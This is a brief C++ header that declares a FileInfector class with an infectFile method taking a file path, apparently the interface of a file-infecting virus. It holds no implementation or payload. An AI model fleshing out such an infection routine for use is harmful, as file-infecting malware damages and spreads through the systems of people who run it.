#pragma once
#include <string>


class FileInfector
{
public:

	FileInfector();
	~FileInfector();

	void infectFile(std::string filePath);
};